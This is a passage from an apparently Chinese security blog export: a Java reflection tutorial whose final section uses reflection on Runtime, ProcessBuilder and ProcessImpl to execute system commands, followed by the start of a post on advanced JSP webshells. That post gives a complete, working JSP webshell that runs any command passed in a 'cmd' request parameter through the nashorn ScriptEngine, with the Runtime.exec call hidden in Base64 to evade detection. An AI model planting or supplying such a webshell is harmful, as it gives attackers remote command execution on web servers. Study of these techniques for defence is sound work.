setName(String name) &#123;</span><br><span class="line">        this.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public int getAge() &#123;</span><br><span class="line">        return age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setAge(int age) &#123;</span><br><span class="line">        this.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    private String show(String name) &#123;</span><br><span class="line">        //System.out.println(name+&quot;&quot;);</span><br><span class="line">        return name+&quot;正在洗澡&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    private static void teststatic()&#123;</span><br><span class="line">        System.out.println(&quot;static method start&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String toString() &#123;</span><br><span class="line">        return &quot;Person&#123;&quot; +</span><br><span class="line">                &quot;name=&#x27;&quot; + name + &#x27;\&#x27;&#x27; +</span><br><span class="line">                &quot;, age=&quot; + age +</span><br><span class="line">                &#x27;&#125;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>User.java</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class User extends Person&#123;</span><br><span class="line">    private int id;</span><br><span class="line">    private String username;</span><br><span class="line">    private String password;</span><br><span class="line">    public int age;</span><br><span class="line"></span><br><span class="line">    public User()&#123;&#125;</span><br><span class="line">    public User(int id, String username, String password, int age) &#123;</span><br><span class="line">        this.id = id;</span><br><span class="line">        this.username = username;</span><br><span class="line">        this.password = password;</span><br><span class="line">        this.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getUsername() &#123;</span><br><span class="line">        return username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setUsername(String username) &#123;</span><br><span class="line">        this.username = username;</span><br><span class="line">    &#125;</span><br><span class="line">    private void show(String username,String password) &#123;</span><br><span class="line">        System.out.println(&quot;用户名：&quot;+username+&quot;，密码：&quot;+password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void study(String username) &#123;</span><br><span class="line">        System.out.println(username+&quot;正在学习~&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    @Override</span><br><span class="line">    public String toString() &#123;</span><br><span class="line">        return &quot;User&#123;&quot; +</span><br><span class="line">                &quot;id=&quot; + id +</span><br><span class="line">                &quot;, username=&#x27;&quot; + username + &#x27;\&#x27;&#x27; +</span><br><span class="line">                &quot;, password=&#x27;&quot; + password + &#x27;\&#x27;&#x27; +</span><br><span class="line">                &quot;, age=&quot; + age +</span><br><span class="line">                &#x27;&#125;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>获取class类对象的四种方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Test &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">            //1.获取class对象</span><br><span class="line">            User user1 = new User();</span><br><span class="line">            Class c1 = user1.getClass();</span><br><span class="line">            System.out.println(&quot;第一种&quot;+c1);</span><br><span class="line"></span><br><span class="line">            //2.通过类的方式获取</span><br><span class="line">            Class c2 = User.class;</span><br><span class="line">            System.out.println(&quot;第二种&quot;+c2);</span><br><span class="line"></span><br><span class="line">            //3.class.forName() 将字节码文件加载到内存</span><br><span class="line">            Class c3;</span><br><span class="line">            try &#123;</span><br><span class="line">                c3 = Class.forName(&quot;User&quot;);</span><br><span class="line">                System.out.println(&quot;第三种&quot;+c3);</span><br><span class="line">            &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            //4. classLoader 类加载器</span><br><span class="line">            ClassLoader classLoader = Test.class.getClassLoader();</span><br><span class="line">            Class aClass = null;</span><br><span class="line">            try &#123;</span><br><span class="line">                aClass = classLoader.loadClass(&quot;User&quot;);</span><br><span class="line">            &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.print(&quot;第四种&quot;+aClass);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220318000222878-285017003.png" alt="image-20220318000221843"></p>
<h2 id="获取成员属性"><a href="#获取成员属性" class="headerlink" title="获取成员属性"></a>获取成员属性</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getFields()          获取所有public修饰的成员属性，包括父类</span><br><span class="line">getDeclaredFields()  获得当前类的所有属性，包括private</span><br><span class="line">getField(变量名)</span><br><span class="line">getDeclaredField(变量名)</span><br></pre></td></tr></table></figure>

<p>获取成员属性的四个方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public void geFieldTest() throws ClassNotFoundException, NoSuchFieldException &#123;</span><br><span class="line">        System.out.println(&quot;getDeclaredFields方法&quot;);</span><br><span class="line">        Class c = Class.forName(&quot;User&quot;);</span><br><span class="line">        Field[] fields = c.getDeclaredFields();</span><br><span class="line">        for (Field f : fields) &#123;</span><br><span class="line">            System.out.println(f);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(&quot;getFields方法&quot;);</span><br><span class="line">        Field[] fields1 = c.getFields();</span><br><span class="line">        for (Field field : fields1) &#123;</span><br><span class="line">            System.out.println(field);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(&quot;getField方法&quot;);</span><br><span class="line">        Field name = c.getField(&quot;name&quot;);</span><br><span class="line">        System.out.println( name.toString());</span><br><span class="line">        System.out.println(&quot;getDeclaredField方法&quot;);</span><br><span class="line">        Field id2 = c.getDeclaredField(&quot;id&quot;);</span><br><span class="line">        System.out.println( id2.toString());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220318003645301-667195828.png" alt="image-20220318003645675"></p>
<h2 id="获取构造方法"><a href="#获取构造方法" class="headerlink" title="获取构造方法"></a>获取构造方法</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取构造方法定义信息</span><br><span class="line">getConstructor(参数类型列表)//获取公开的构造方法</span><br><span class="line">getConstructors()//获取所有的公开的构造方法</span><br><span class="line">getDeclaredConstructors()//获取所有的构造方法,包括私有</span><br><span class="line">getDeclaredConstructor(int.class,String.class)//获得当前类指定的构造方法</span><br></pre></td></tr></table></figure>

<p>获取构造方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public void getConstructorTest() throws ClassNotFoundException, NoSuchMethodException &#123;</span><br><span class="line">        Class clazz = Class.forName(&quot;User&quot;);</span><br><span class="line">        System.out.println(&quot;getDeclaredConstructors方法：&quot;);</span><br><span class="line">        Constructor[] cs = clazz.getDeclaredConstructors();</span><br><span class="line">        for (Constructor con : cs) &#123;</span><br><span class="line">            System.out.println(con);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(&quot;getConstructors方法：&quot;);</span><br><span class="line">        Constructor[] cs1 = clazz.getConstructors();</span><br><span class="line">        for (Constructor con : cs1) &#123;</span><br><span class="line">            System.out.println(con);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(&quot;getConstructor方法：&quot;);</span><br><span class="line">        Constructor constructor = clazz.getConstructor();</span><br><span class="line">        System.out.println(constructor);</span><br><span class="line">        System.out.println(&quot;getDeclaredConstructor方法：&quot;);</span><br><span class="line">        Constructor declaredConstructor1 = clazz.getDeclaredConstructor(int.class, String.class, String.class, int.class);</span><br><span class="line">        System.out.println(declaredConstructor1);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220318010135923-1017326857.png" alt="image-20220318010136369"></p>
<p>获取父类的构造方法:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public void getFatherConstructorTest() throws ClassNotFoundException &#123;</span><br><span class="line">        Class clazz = Class.forName(&quot;User&quot;);</span><br><span class="line">        Class superclass = clazz.getSuperclass();</span><br><span class="line">        Constructor[] cs = superclass.getDeclaredConstructors();</span><br><span class="line">        for (Constructor con : cs) &#123;</span><br><span class="line">            System.out.println(con);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220318010301021-1264663033.png" alt="image-20220318010301538"></p>
<h2 id="获取成员方法"><a href="#获取成员方法" class="headerlink" title="获取成员方法"></a>获取成员方法</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">getMethods</span>()<span class="comment">//获取当前类和父类的所有公有的public方法，并以数组返回</span></span><br><span class="line"><span class="built_in">getMethod</span>(方法名,参数类型列表)<span class="comment">//获取某个public方法</span></span><br><span class="line"><span class="built_in">getDeclaredMethods</span>()<span class="comment">//只查询当前类的所有定义的方法（包含private），并以数组返回</span></span><br><span class="line"><span class="built_in">getDeclaredMethod</span>()<span class="comment">//获取某个方法，传入的第一个参数为方法名，第二个参数为方法参数</span></span><br></pre></td></tr></table></figure>

<p>获取成员方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public void getMethod() throws ClassNotFoundException, NoSuchMethodException &#123;</span><br><span class="line">        Class c = Class.forName(&quot;User&quot;);</span><br><span class="line">        System.out.println(&quot;getDeclaredMethods方法：&quot;);</span><br><span class="line">        Method[] method = c.getDeclaredMethods();</span><br><span class="line">        for (Method meth : method) &#123;</span><br><span class="line">            System.out.println(meth);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(&quot;getDeclaredMethod方法：&quot;);</span><br><span class="line">        Method show = c.getDeclaredMethod(&quot;show&quot;, String.class,String.class);</span><br><span class="line">        System.out.println(show);</span><br><span class="line">        System.out.println(&quot;getMethods方法：&quot;);</span><br><span class="line">        Method[] method1 = c.getMethods();</span><br><span class="line">        for (Method meth : method1) &#123;</span><br><span class="line">            System.out.println(meth);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(&quot;getMethod方法：&quot;);</span><br><span class="line">        Method study = c.getMethod(&quot;study&quot;, String.class);</span><br><span class="line">        System.out.println(study);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220318011322504-2058677201.png" alt="image-20220318011322727"></p>
<h2 id="反射调用属性"><a href="#反射调用属性" class="headerlink" title="反射调用属性"></a>反射调用属性</h2><p>调用属性：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public void getFieldValue() throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        Class c = Class.forName(&quot;User&quot;);</span><br><span class="line">        Field agefield = c.getField(&quot;age&quot;);</span><br><span class="line">        User u = new User(1,&quot;jack&quot;,&quot;123456&quot;,18);</span><br><span class="line">        System.out.println(agefield.getInt(u));</span><br><span class="line">        Field usernamefield = c.getDeclaredField(&quot;username&quot;);</span><br><span class="line">        usernamefield.setAccessible(true);</span><br><span class="line">        System.out.println(usernamefield.get(u));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220318013316942-2131037981.png" alt="image-20220318013317502"></p>
<h2 id="反射调用方法"><a href="#反射调用方法" class="headerlink" title="反射调用方法"></a>反射调用方法</h2><p>调用方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public void getMethodValue() throws ClassNotFoundException, IllegalAccessException, NoSuchMethodException, InvocationTargetException &#123;</span><br><span class="line">        Class c = Class.forName(&quot;User&quot;);</span><br><span class="line">        Method study = c.getDeclaredMethod(&quot;study&quot;, String.class);</span><br><span class="line">        User u = new User(1,&quot;jack&quot;,&quot;123456&quot;,18);</span><br><span class="line">        study.invoke(u, &quot;jack&quot;);</span><br><span class="line">        Method show = c.getDeclaredMethod(&quot;show&quot;, String.class,String.class);</span><br><span class="line">        show.setAccessible(true);</span><br><span class="line">        show.invoke(u,&quot;test&quot;,&quot;123&quot;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>想要访问<code>show()</code>方法，使用<code>getDeclaredMethod()</code>方法，并传入方法名，以及形参。又因为该方法为private，所以需要使用<code>setAccessible()</code>设置访问权限。</p>
<p><em>注：setAccessible作用是启动和禁止访问安全检查的开关，参数为true表示反射的对象在使用时应该取消java语言访问检查，参数为false则表示反射的对象实施对java语言的访问检查。</em></p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220318013910881-830263423.png" alt="image-20220318013911374"></p>
<h2 id="反射创建对象"><a href="#反射创建对象" class="headerlink" title="反射创建对象"></a>反射创建对象</h2><p>上面的例子我们是用new的方式来创建的对象，也可以通过反射创建对象</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Class.newInstance()   只能够调用无参的构造方法，即默认的构造方法；要求构造方法必须是public类型的。</span><br><span class="line">Constructor.newInstance() 可以根据传入的参数，调用任意的构造方法； 特定情况下可以调用私有的构造方法。</span><br></pre></td></tr></table></figure>

<p>创建对象：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public void getInstance() throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException &#123;</span><br><span class="line">        // 1. 获得class对象</span><br><span class="line">        Class clazz = Class.forName(&quot;User&quot;);</span><br><span class="line">        // 2. 获取无参构造器</span><br><span class="line">        Constructor declaredConstructor = clazz.getDeclaredConstructor();</span><br><span class="line">        // 3. Constructor.newInstance() 创建对象</span><br><span class="line">        Object test = declaredConstructor.newInstance();</span><br><span class="line">        User user = (User) test;</span><br><span class="line">        // 4. 获取方法</span><br><span class="line">        Method study = clazz.getDeclaredMethod(&quot;study&quot;, String.class);</span><br><span class="line">        study.invoke(user, &quot;jack&quot;);</span><br><span class="line">        Object o = clazz.newInstance();</span><br><span class="line">        User user1 = (User) o;</span><br><span class="line">        Method show = clazz.getDeclaredMethod(&quot;show&quot;, String.class, String.class);</span><br><span class="line">        show.setAccessible(true);</span><br><span class="line">        show.invoke(user, &quot;jack&quot;,&quot;123&quot;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220318014627290-594059492.png" alt="image-20220318014627850"></p>
<p>因为User类有两个构造方法，我们尝试用另一个有参构造器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public void getInstance1() throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException &#123;</span><br><span class="line">		// 1. 获得class对象</span><br><span class="line">		Class clazz = Class.forName(&quot;User&quot;);</span><br><span class="line">        // 2. 获取有参构造器</span><br><span class="line">        Constructor declaredConstructor2 = clazz.getDeclaredConstructor(int.class,String.class,String.class,int.class);</span><br><span class="line">        // 3. Constructor.newInstance() 创建对象</span><br><span class="line">        Object test1 = declaredConstructor2.newInstance(1,&quot;jack&quot;,&quot;123&quot;,18);</span><br><span class="line">        User user2= (User) test1;</span><br><span class="line">        System.out.println(user2.toString());</span><br><span class="line">        // 4. 获取方法</span><br><span class="line">        Method study1 = clazz.getDeclaredMethod(&quot;study&quot;, String.class);</span><br><span class="line">        study1.invoke(user2,&quot;jack&quot;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220318015105253-1775580376.png" alt="image-20220318015105785"></p>
<p>结论为：在newInstance创建对象的时候，对应有参构造器，传入形参。</p>
<p>再尝试反射创建对象并调用public show() 私有方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">		Class clazz = Class.forName(&quot;User&quot;);</span><br><span class="line">		Constructor declaredConstructor2 = clazz.getDeclaredConstructor(int.class,String.class,String.class,int.class);</span><br><span class="line">        Object test1 = declaredConstructor2.newInstance(1,&quot;jack&quot;,&quot;123&quot;,18);</span><br><span class="line">        User user2= (User) test1;</span><br><span class="line">        System.out.println(user2.toString());</span><br><span class="line">Method show1 = clazz.getDeclaredMethod(&quot;show&quot;, String.class,String.class);</span><br><span class="line">        show1.setAccessible(true);</span><br><span class="line">        show1.invoke(user2,&quot;jack&quot;,&quot;123456&quot;);</span><br></pre></td></tr></table></figure>

<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220318015906981-1821344853.png" alt="image-20220318015907570"></p>
<h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><p>反射调用命令执行常用到的Runtime类</p>
<p>正常使用Runtime类执行系统命令为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Process p = Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">//使用ProcessBuilder类进行命令执行</span><br><span class="line">new ProcessBuilder(new String[]&#123;&quot;calc.exe&quot;&#125;).start();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>反射的过程首先获得Runtime类，再查看该类的构造方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Class clazz = Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="line">Constructor[] declaredConstructors = clazz.getDeclaredConstructors();</span><br><span class="line">        for(Constructor con : declaredConstructors)&#123;</span><br><span class="line">            System.out.print(con);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220318020639684-1354363174.png" alt="image-20220318020639913"></p>
<p>只有一个私有的无参构造器，获取该构造器并通过<code>setAccessible</code>设置访问权限。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Constructor declaredConstructor = clazz.getDeclaredConstructor();</span><br><span class="line">declaredConstructor.setAccessible(true);</span><br></pre></td></tr></table></figure>

<p>有了构造器，就可以通过构造器创建对象</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Object o = declaredConstructor.newInstance();</span><br></pre></td></tr></table></figure>

<p>查看当前类的所有方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Method[] declaredMethods = clazz.getDeclaredMethods();</span><br><span class="line">for(Method meth : declaredMethods)&#123;</span><br><span class="line">   System.out.println(meth);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220318021137714-1736343164.png" alt="image-20220318021137716"></p>
<p>可以看到<code>exec()</code>方法对应的都是public属性，且可以传入String类型，也可以传入String[]类型，比如使用传入String类型的方法，那在<code>getDeclaredMethod()</code>方法后传入的第一个参数为exec()方法名，第二个参数为String.class。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Method method = clazz.getDeclaredMethod(&quot;exec&quot;, String.class);</span><br></pre></td></tr></table></figure>

<p>并使用invoke()方法执行exec()方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">method.invoke(o,&quot;calc.exe&quot;);</span><br></pre></td></tr></table></figure>

<p>所以综上，代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public void getRuntimeExec() throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException &#123;</span><br><span class="line">    // 1. 获得class对象</span><br><span class="line">    Class clazz = Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="line">    // 2. 获取无参构造器</span><br><span class="line">    Constructor declaredConstructor = clazz.getDeclaredConstructor();</span><br><span class="line">    declaredConstructor.setAccessible(true);</span><br><span class="line">    // 3. Constructor.newInstance() 创建对象</span><br><span class="line">    Object o = declaredConstructor.newInstance();</span><br><span class="line">    //Runtime o1 = (Runtime) o;</span><br><span class="line">    // 4. 获取方法</span><br><span class="line">    Method show = clazz.getDeclaredMethod(&quot;exec&quot;, String.class);</span><br><span class="line">    show.invoke(o,&quot;calc.exe&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220318021718036-1038767942.png" alt="image-20220318021718437"></p>
<p>也可以调用传入String[] 参数类型的方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public void getRuntimeExecs() throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        Class clazz = Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="line">        Constructor declaredConstructor = clazz.getDeclaredConstructor();</span><br><span class="line">        declaredConstructor.setAccessible(true);</span><br><span class="line">        Object o = declaredConstructor.newInstance();</span><br><span class="line">        String[] cmd = new String[]&#123;&quot;cmd.exe&quot;, &quot;-c&quot;, &quot;calc.exe&quot;&#125;;</span><br><span class="line">        Method method = clazz.getDeclaredMethod(&quot;exec&quot;, String[].class);</span><br><span class="line">        method.invoke(o, cmd);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220318022232346-231107157.png" alt="image-20220318022232597"></p>
<p>同样，ProcessImpl类、ProcessBuilder类也可以反射调用执行系统命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> //ProcessBuilder类-&gt;获取传入List.class的构造  </span><br><span class="line">   public void getProcessBuilder1() throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException &#123;</span><br><span class="line">        Class clazz = Class.forName(&quot;java.lang.ProcessBuilder&quot;);</span><br><span class="line">        Constructor declaredConstructor = clazz.getDeclaredConstructor(List.class);</span><br><span class="line">        ArrayList&lt;Object&gt; lists = new ArrayList&lt;&gt;();</span><br><span class="line">        lists.add(&quot;calc.exe&quot;);</span><br><span class="line">        Object o = declaredConstructor.newInstance((List) lists);</span><br><span class="line">        Method start = clazz.getDeclaredMethod(&quot;start&quot;);</span><br><span class="line">        start.invoke(o);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">//ProcessBuilder类-&gt;获取传入String[].class的构造</span><br><span class="line">public void getProcessBuilder2() throws ClassNotFoundException, IOException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        new ProcessBuilder().command(&quot;calc.exe&quot;).start();</span><br><span class="line">        Class clazz = Class.forName(&quot;java.lang.ProcessBuilder&quot;);</span><br><span class="line">        String[] cmds = new String[]&#123;&quot;calc.exe&quot;&#125;;</span><br><span class="line">        Constructor declaredConstructors = clazz.getDeclaredConstructor(String[].class);</span><br><span class="line">        Object o = declaredConstructors.newInstance((Object) cmds);</span><br><span class="line">        Method command = clazz.getDeclaredMethod(&quot;start&quot;);</span><br><span class="line">        command.invoke(o);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //ProcessImpl类</span><br><span class="line">    public void getProcessImpl1() throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException &#123;</span><br><span class="line">        Class clazz = Class.forName(&quot;java.lang.ProcessImpl&quot;);</span><br><span class="line">        Constructor[] declaredConstructors = clazz.getDeclaredConstructors();</span><br><span class="line">        String[] cmds = new String[]&#123;&quot;calc.exe&quot;&#125;;</span><br><span class="line">        Method startMethod = clazz.getDeclaredMethod(&quot;start&quot;, String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class);</span><br><span class="line">        startMethod.setAccessible(true);</span><br><span class="line">        startMethod.invoke(null, cmds, null, null,null, false);//这里需要的五个参数，第一个参数为null，因为调用的方法是这个类的静态方法</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="方法清单"><a href="#方法清单" class="headerlink" title="方法清单"></a>方法清单</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取包名 类名</span><br><span class="line">clazz.getPackage().getName()//包名</span><br><span class="line">clazz.getSimpleName()//类名</span><br><span class="line">clazz.getName()//完整类名</span><br><span class="line"></span><br><span class="line">获取成员变量定义信息</span><br><span class="line">getFields()//获取所有公开的成员变量,包括继承变量</span><br><span class="line">getDeclaredFields()//获取本类定义的成员变量,包括私有,但不包括继承的变量</span><br><span class="line">getField(变量名)</span><br><span class="line">getDeclaredField(变量名)</span><br><span class="line"></span><br><span class="line">获取构造方法定义信息</span><br><span class="line">getConstructor(参数类型列表)//获取公开的构造方法</span><br><span class="line">getConstructors()//获取所有的公开的构造方法</span><br><span class="line">getDeclaredConstructors()//获取所有的构造方法,包括私有</span><br><span class="line">getDeclaredConstructor(int.class,String.class)</span><br><span class="line"></span><br><span class="line">获取方法定义信息</span><br><span class="line">getMethods()//获取所有可见的方法,包括继承的方法</span><br><span class="line">getMethod(方法名,参数类型列表)</span><br><span class="line">getDeclaredMethods()//获取本类定义的的方法,包括私有,不包括继承的方法</span><br><span class="line">getDeclaredMethod(方法名,int.class,String.class)</span><br><span class="line"></span><br><span class="line">反射新建实例</span><br><span class="line">clazz.newInstance();//执行无参构造创建对象</span><br><span class="line">clazz.newInstance(666,”海绵宝宝”);//执行含参构造创建对象</span><br><span class="line">clazz.getConstructor(int.class,String.class)//获取构造方法</span><br><span class="line"></span><br><span class="line">反射调用成员变量</span><br><span class="line">clazz.getDeclaredField(变量名);//获取变量</span><br><span class="line">clazz.setAccessible(true);//使私有成员允许访问</span><br><span class="line">f.set(实例,值);//为指定实例的变量赋值,静态变量,第一参数给null</span><br><span class="line">f.get(实例);//访问指定实例变量的值,静态变量,第一参数给null</span><br><span class="line"></span><br><span class="line">反射调用成员方法</span><br><span class="line">Method m = Clazz.getDeclaredMethod(方法名,参数类型列表);</span><br><span class="line">m.setAccessible(true);//使私有方法允许被调用</span><br><span class="line">m.invoke(实例,参数数据);//让指定实例来执行该方法</span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><p><a href="https://www.jianshu.com/p/0a92aa558bc3">Java 反射机制学习 - 简书 (jianshu.com)</a></p>
</li>
<li><p><a href="https://blog.csdn.net/weixin_43884234/article/details/115056812">(一起学JAVA 反射学习(超详细)</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>反射</tag>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>JSP Webshell进阶</title>
    <url>/2022/03/21/JSP-Webshell%E8%BF%9B%E9%98%B6/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer"/>

<p>之前学习了基础的JSP Webshell的免杀思路，现在学习下其他的构建思路</p>
<span id="more"></span>

<h2 id="使用ScriptEngine"><a href="#使用ScriptEngine" class="headerlink" title="使用ScriptEngine"></a>使用ScriptEngine</h2><p>使用Java自带的<code>ScriptEngine</code>可以说是最完美的Java动态执行代码方案之一</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%@ page import=&quot;javax.script.ScriptEngineManager&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.util.Base64&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.BufferedReader&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.InputStreamReader&quot; %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;ScriptEngine.eval的JSP Webshell&lt;/h2&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String s1 = &quot;s=[3];s[0]=&#x27;cmd.exe&#x27;;s[1]=&#x27;/c&#x27;;s[2]=&#x27;&quot;;</span><br><span class="line">    String s2 = request.getParameter(&quot;cmd&quot;);</span><br><span class="line">    String s3 = new String(Base64.getDecoder().decode(&quot;JztqYXZhLmxhbmcuUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhzKTs=&quot;));</span><br><span class="line">    Process process = (Process) new ScriptEngineManager().getEngineByName(&quot;nashorn&quot;).eval(s1 + s2 + s3);</span><br><span class="line">    InputStream inputStream = process.getInputStream();</span><br><span class="line">    StringBuilder stringBuilder = new StringBuilder();</span><br><span class="line">    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));</span><br><span class="line">    String line;</span><br><span class="line">    while((line = bufferedReader.readLine()) != null) &#123;</span><br><span class="line">        stringBuilder.append(line).append(&quot;\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if (stringBuilder.length() &gt; 0) &#123;</span><br><span class="line">        response.getOutputStream().write(stringBuilder.toString().getBytes());</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220321160323743-1990046549.png" alt="image-20220321160323251"></p>
<h2 id="使用ScriptLoader"><a href="#使用ScriptLoader" class="headerlink" title="使用ScriptLoader"></a>使用ScriptLoader</h2><p>使用的是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Jdk.nashorn.internal.runtime.ScriptLoader类加载器加载的JSP Webshell</span><br></pre></td></tr></table></figure>

<p>如果某些类加载器被禁用了，就可以使用这个特殊的类加载器去加载字节码执行</p>
